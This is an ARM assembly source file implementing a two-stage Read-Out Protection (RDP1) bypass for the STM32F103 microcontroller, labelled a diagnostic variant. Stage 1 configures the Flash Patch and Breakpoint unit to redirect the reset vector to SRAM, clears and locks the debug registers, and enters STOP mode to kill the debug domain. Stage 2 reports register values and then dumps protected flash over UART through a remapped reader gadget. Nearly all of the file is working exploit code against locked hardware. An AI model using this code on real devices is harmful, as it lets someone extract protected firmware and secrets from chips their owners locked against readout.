/*
 * STM32F103 RDP1 Bypass — Diagnostic variant with STOP debug kill
 *
 * Stage 1 (SRAM boot / SWD upload):
 *   - Configures FPB to redirect reset vector (0x04) to SRAM
 *   - Clears C_DEBUGEN, DEMCR, DBGMCU_CR, DWT, locks CoreSight
 *   - Enters STOP mode with DBG_STOP=0 → debug domain powers down
 *   - Wakes via RTC alarm (~2ms), waits for nRST
 *
 * Stage 2 (flash boot via FPB redirect):
 *   - Sends diagnostic register dumps before flash read
 *   - Protocol: "RDP1" + CPUID(4B) + "DIAG" + 7 registers(28B) + flash bytes
 *
 * Diagnostic registers (4 bytes each, little-endian):
 *   1. DHCSR    (0xE000EDF0) — C_DEBUGEN in bit 0
 *   2. DEMCR    (0xE000EDFC) — VC_CORERESET in bit 0
 *   3. FP_CTRL  (0xE0002000) — FPB enable in bit 0
 *   4. FP_COMP0 (0xE0002008) — comparator 0 config
 *   5. VTOR     (0xE000ED08) — vector table offset (0=flash, 0x20000000=SRAM)
 *   6. FLASH_OBR(0x4002201C) — RDP status (bit 1 = RDPRT)
 *   7. RCC_CSR  (0x40021024) — reset cause flags
 */
.syntax unified
.thumb
.cpu cortex-m3

.section .text

/* ========== Vector table ========== */
.word 0x20005000          /* Initial SP (top of 20KB SRAM) */
.word nop_sled + 1        /* Reset vector -> NOP sled */

/* NOP sled: 0x20000008 through 0x200001FF (252 NOPs = 504 bytes) */
nop_sled:
.rept 252
    nop
.endr

/* ========== STAGE 1: Configure FPB + STOP debug kill ========== */
stage1_start:
    /* Enable GPIOA clock: RCC_APB2ENR |= (1 << 2) */
    ldr r0, =0x40021018    /* RCC_APB2ENR */
    ldr r1, [r0]
    orrs r1, r1, #4
    str r1, [r0]

    movs r2, #100
1:  subs r2, #1
    bne 1b

    /* Configure PA5 as push-pull output, 2MHz (LED) */
    ldr r0, =0x40010800    /* GPIOA_CRL */
    ldr r1, [r0]
    bic r1, r1, #0x00F00000
    orr r1, r1, #0x00200000
    str r1, [r0]

    /* Write stage 2 thumb address to remap table at 0x20000020 */
    ldr r0, =stage2_start + 1
    ldr r1, =0x20000020
    str r0, [r1]

    /* Write FPB reader function to remap table entry 1 (0x20000024)
     * ldr r0,[r0] = 0x6800, bx lr = 0x4770 → combined LE: 0x47706800 */
    ldr r0, =0x47706800
    ldr r1, =0x20000024
    str r0, [r1]

    /* Configure FPB */
    ldr r0, =0xE0002000    /* FPB base */
    movs r1, #3             /* FP_CTRL: ENABLE + KEY */
    str r1, [r0, #0]
    movs r1, #0x20          /* FP_REMAP: remap base 0x20000020 */
    str r1, [r0, #4]
    movs r1, #0x05          /* FP_COMP0: ENABLE + match addr 0x04 (reset vector) */
    str r1, [r0, #8]
    /* FP_COMP1: ENABLE + match addr 0x08000100 (reader function) */
    ldr r1, =0x08000101     /* addr | ENABLE */
    str r1, [r0, #0x0C]

    /* LED on to indicate FPB configured */
    ldr r4, =0x40010810    /* GPIOA_BSRR */
    movs r0, #32
    str r0, [r4]

    /* ---- Aggressively clear debug state (from stimpik) ---- */

    /* Clear C_DEBUGEN via DHCSR (needs debug key) */
    ldr r0, =0xE000EDF0    /* DHCSR */
    ldr r1, =0xA05F0000    /* DBGKEY + no flags = clear all debug bits */
    str r1, [r0]

    /* Clear DEMCR: disable TRCENA, vector catch, MON_EN */
    ldr r0, =0xE000EDFC    /* DEMCR */
    movs r1, #0
    str r1, [r0]

    /* Clear DBGMCU_CR: no debug in STOP/STANDBY/SLEEP */
    ldr r0, =0xE0042004    /* DBGMCU_CR */
    movs r1, #0
    str r1, [r0]

    /* Disable DWT */
    ldr r0, =0xE0001000    /* DWT_CTRL */
    movs r1, #0
    str r1, [r0]

    /* Lock CoreSight components (write anything != 0xC5ACCE55) */
    ldr r0, =0xE0000FB0    /* ITM_LAR */
    movs r1, #0
    str r1, [r0]
    ldr r0, =0xE0001FB0    /* DWT_LAR */
    str r1, [r0]
    ldr r0, =0xE0040FB0    /* TPIU_LAR */
    str r1, [r0]
    /* Don't lock FPB — we need it for the redirect! */

    /* ---- Enter STOP mode to gate debug domain clocks ---- */

    /* Enable PWR and BKP clocks: RCC_APB1ENR |= (1<<28) | (1<<27) */
    ldr r0, =0x4002101C    /* RCC_APB1ENR */
    ldr r1, [r0]
    orr r1, r1, #0x18000000
    str r1, [r0]
    movs r2, #10
2:  subs r2, #1
    bne 2b

    /* Enable backup domain write access: PWR_CR |= (1<<8) DBP */
    ldr r0, =0x40007000    /* PWR_CR */
    ldr r1, [r0]
    orr r1, r1, #0x100
    str r1, [r0]

    /* Enable LSI oscillator: RCC_CSR |= 1 */
    ldr r0, =0x40021024    /* RCC_CSR */
    ldr r1, [r0]
    orr r1, r1, #1
    str r1, [r0]

    /* Wait for LSIRDY (bit 1) */
3:  ldr r1, [r0]
    tst r1, #2
    beq 3b

    /* Select LSI as RTC clock and enable RTC */
    ldr r0, =0x40021020    /* RCC_BDCR */
    ldr r1, [r0]
    bic r1, r1, #0x300      /* Clear RTCSEL bits */
    orr r1, r1, #0x200      /* RTCSEL = 10 (LSI) */
    str r1, [r0]
    ldr r1, [r0]
    orr r1, r1, #0x8000     /* RTCEN */
    str r1, [r0]

    /* Wait for RTC sync: RSF bit 3 in RTC_CRL */
    ldr r0, =0x40002804    /* RTC_CRL */
4:  ldr r1, [r0]
    tst r1, #8
    beq 4b

    /* Enter RTC config mode: wait RTOFF (bit 5), set CNF (bit 4) */
5:  ldr r1, [r0]
    tst r1, #0x20
    beq 5b
    ldr r1, [r0]
    orr r1, r1, #0x10
    str r1, [r0]

    /* No prescaler — counter at LSI rate (~40kHz) */
    ldr r0, =0x40002808    /* RTC_PRLH */
    movs r1, #0
    str r1, [r0]
    ldr r0, =0x4000280C    /* RTC_PRLL */
    str r1, [r0]

    /* Set alarm ~2ms ahead (80 ticks at ~40kHz) */
    ldr r0, =0x40002818    /* RTC_CNTH */
    ldr r1, [r0]
    ldr r0, =0x4000281C    /* RTC_CNTL */
    ldr r2, [r0]
    orr r2, r2, r1, lsl #16  /* cnt = (CNTH<<16) | CNTL */
    adds r2, r2, #80          /* alarm = cnt + 80 */

    ldr r0, =0x40002820    /* RTC_ALRH */
    lsrs r1, r2, #16
    str r1, [r0]
    ldr r0, =0x40002824    /* RTC_ALRL */
    uxth r1, r2
    str r1, [r0]

    /* Exit RTC config mode: clear CNF, wait RTOFF */
    ldr r0, =0x40002804    /* RTC_CRL */
    ldr r1, [r0]
    bic r1, r1, #0x10
    str r1, [r0]
6:  ldr r1, [r0]
    tst r1, #0x20
    beq 6b

    /* Enable RTC alarm interrupt: RTC_CRH |= (1<<1) ALRIE */
    ldr r0, =0x40002800    /* RTC_CRH */
    ldr r1, [r0]
    orr r1, r1, #2
    str r1, [r0]

    /* EXTI line 17 = RTC alarm, rising edge, event+interrupt */
    ldr r0, =0x40010400    /* EXTI_IMR */
    ldr r1, [r0]
    orr r1, r1, #0x20000
    str r1, [r0]
    ldr r0, =0x40010404    /* EXTI_EMR */
    ldr r1, [r0]
    orr r1, r1, #0x20000
    str r1, [r0]
    ldr r0, =0x40010408    /* EXTI_RTSR */
    ldr r1, [r0]
    orr r1, r1, #0x20000
    str r1, [r0]

    /* Configure STOP mode: PWR_CR.PDDS=0 + SCB_SCR SEVONPEND|SLEEPDEEP */
    ldr r0, =0x40007000    /* PWR_CR */
    ldr r1, [r0]
    bic r1, r1, #2          /* PDDS = 0 (STOP, not standby) */
    str r1, [r0]

    ldr r0, =0xE000ED10    /* SCB_SCR */
    ldr r1, [r0]
    orr r1, r1, #0x14       /* SEVONPEND (bit 4) | SLEEPDEEP (bit 2) */
    str r1, [r0]

    /* Enter STOP — debug domain powers down, clearing C_DEBUGEN */
    dsb
    wfe

    /* Woken from STOP — clear sleep bits */
    ldr r0, =0xE000ED10    /* SCB_SCR */
    ldr r1, [r0]
    bic r1, r1, #0x14
    str r1, [r0]

    /* Quick UART report: send "S1:X\n" where X = C_DEBUGEN value ('0' or '1') */
    /* Re-enable clocks (STOP gates them) */
    ldr r0, =0x40021018    /* RCC_APB2ENR */
    ldr r1, [r0]
    orr r1, r1, #4         /* IOPAEN */
    orr r1, r1, #0x4000    /* USART1EN */
    str r1, [r0]
    ldr r2, =5000
7:  subs r2, #1
    bne 7b

    /* PA9 AF push-pull */
    ldr r0, =0x40010804    /* GPIOA_CRH */
    ldr r1, [r0]
    bic r1, r1, #0xF0
    orr r1, r1, #0xA0
    str r1, [r0]

    /* USART1: 115200 @ 8MHz HSI */
    ldr r0, =0x40013808    /* USART1_BRR */
    movs r1, #0x45
    str r1, [r0]
    ldr r0, =0x4001380C    /* USART1_CR1 */
    movw r1, #0x2008       /* UE + TE */
    str r1, [r0]
    movs r2, #200
8:  subs r2, #1
    bne 8b

    /* Read DHCSR bit 0 */
    ldr r0, =0xE000EDF0
    ldr r1, [r0]
    and r5, r1, #1         /* Save C_DEBUGEN in r5 (callee-saved) */

    /* Send "S1:X\n" via USART1 */
    ldr r4, =0x40013800    /* USART1 base */
    movs r0, #0x53         /* 'S' */
    bl uart_send_byte
    movs r0, #0x31         /* '1' */
    bl uart_send_byte
    movs r0, #0x3A         /* ':' */
    bl uart_send_byte
    adds r0, r5, #0x30     /* '0' or '1' from saved r5 */
    bl uart_send_byte
    movs r0, #0x0A         /* '\n' */
    bl uart_send_byte

    /* Wait for nRST — FPB + dead debug survive system reset */
stage1_wait:
    b stage1_wait

/* ========== STAGE 2: Diagnostic + Flash Dump via UART ========== */
.align 2
stage2_start:
    ldr sp, =0x20005000

    ldr r0, =0x40021018    /* RCC_APB2ENR */
    ldr r1, [r0]
    orrs r1, r1, #4        /* IOPAEN */
    orr r1, r1, #0x4000    /* USART1EN */
    str r1, [r0]

    ldr r2, =50000
1:  subs r2, #1
    bne 1b

    ldr r0, =0x40010800    /* GPIOA_CRL */
    ldr r1, [r0]
    bic r1, r1, #0x00F00000
    orr r1, r1, #0x00200000
    str r1, [r0]

    ldr r4, =0x40010810    /* GPIOA_BSRR */
    movs r0, #32
    str r0, [r4]

    ldr r0, =0x40010804    /* GPIOA_CRH */
    ldr r1, [r0]
    bic r1, r1, #0xF0
    orr r1, r1, #0xA0
    str r1, [r0]

    ldr r0, =0x40013808    /* USART1_BRR */
    movs r1, #0x45         /* 115200 baud at 8MHz HSI */
    str r1, [r0]
    ldr r0, =0x4001380C    /* USART1_CR1 */
    movw r1, #0x2008       /* UE + TE */
    str r1, [r0]

    movs r2, #200
2:  subs r2, #1
    bne 2b

    ldr r4, =0x40013800    /* USART1 base */

    /* Send header "RDP1" */
    movs r0, #0x52         /* 'R' */
    bl uart_send_byte
    movs r0, #0x44         /* 'D' */
    bl uart_send_byte
    movs r0, #0x50         /* 'P' */
    bl uart_send_byte
    movs r0, #0x31         /* '1' */
    bl uart_send_byte

    /* Send CPUID (4 bytes LE) */
    ldr r5, =0xE000ED00
    ldr r3, [r5]
    bl send_word

    /* Send "DIAG" marker */
    movs r0, #0x44         /* 'D' */
    bl uart_send_byte
    movs r0, #0x49         /* 'I' */
    bl uart_send_byte
    movs r0, #0x41         /* 'A' */
    bl uart_send_byte
    movs r0, #0x47         /* 'G' */
    bl uart_send_byte

    /* Reg 1: DHCSR (0xE000EDF0) — C_DEBUGEN = bit 0 */
    ldr r5, =0xE000EDF0
    ldr r3, [r5]
    bl send_word

    /* Reg 2: DEMCR (0xE000EDFC) — VC_CORERESET = bit 0 */
    ldr r5, =0xE000EDFC
    ldr r3, [r5]
    bl send_word

    /* Reg 3: FP_CTRL (0xE0002000) — ENABLE = bit 0 */
    ldr r5, =0xE0002000
    ldr r3, [r5]
    bl send_word

    /* Reg 4: FP_COMP0 (0xE0002008) — comparator config */
    ldr r5, =0xE0002008
    ldr r3, [r5]
    bl send_word

    /* Reg 5: VTOR (0xE000ED08) — vector table offset (0=flash, 0x20000000=SRAM) */
    ldr r5, =0xE000ED08
    ldr r3, [r5]
    bl send_word

    /* Reg 6: FLASH_OBR (0x4002201C) — RDPRT = bit 1 */
    ldr r5, =0x4002201C
    ldr r3, [r5]
    bl send_word

    /* Reg 7: RCC_CSR (0x40021024) — reset flags bits[31:24] */
    ldr r5, =0x40021024
    ldr r3, [r5]
    bl send_word

    /* Set up hardfault handler: write vector table at 0x20004F00 */
    ldr r6, =0x20004F00
    ldr r0, =0x20005000       /* SP */
    str r0, [r6, #0]
    ldr r0, =hardfault_handler + 1
    str r0, [r6, #0x0C]      /* HardFault vector at offset 0x0C */
    /* Point VTOR to our SRAM vector table */
    ldr r0, =0xE000ED08
    str r6, [r0]

    /* Dump flash via FPB reader function at 0x08000101 (thumb)
     * FPB remaps instruction fetch from 0x08000100 to SRAM reader
     * PC appears in flash range → flash controller allows data reads */
    ldr r5, =0x08000000      /* Flash address to read */
    ldr r6, =0x08000101      /* FPB reader function (thumb) */
dump_loop:
    mov r0, r5                /* Address to read */
    blx r6                    /* Call reader: r0 = *(uint32_t*)r0 */
    mov r3, r0                /* Result to r3 for send_word */
    bl send_word
    adds r5, #4
    b dump_loop

/* HardFault handler: send "FAULT\n" then spin */
hardfault_handler:
    ldr r4, =0x40013800       /* USART1 base */
    movs r0, #0x46            /* 'F' */
    bl uart_send_byte
    movs r0, #0x41            /* 'A' */
    bl uart_send_byte
    movs r0, #0x55            /* 'U' */
    bl uart_send_byte
    movs r0, #0x4C            /* 'L' */
    bl uart_send_byte
    movs r0, #0x54            /* 'T' */
    bl uart_send_byte
    movs r0, #0x0A            /* '\n' */
    bl uart_send_byte
3:  b 3b

/* ========== Send word in r3 (4 bytes LE) ========== */
/* Preserves r4-r7, clobbers r0-r3 */
send_word:
    push {lr}
    mov r0, r3
    bl uart_send_byte
    lsrs r0, r3, #8
    bl uart_send_byte
    lsrs r0, r3, #16
    bl uart_send_byte
    lsrs r0, r3, #24
    bl uart_send_byte
    pop {pc}

/* ========== UART helper ========== */
uart_send_byte:
    and r0, r0, #0xFF
1:  ldr r1, [r4]          /* USART1_SR */
    tst r1, #0x80          /* TXE */
    beq 1b
    str r0, [r4, #4]      /* USART1_DR */
    bx lr

.pool
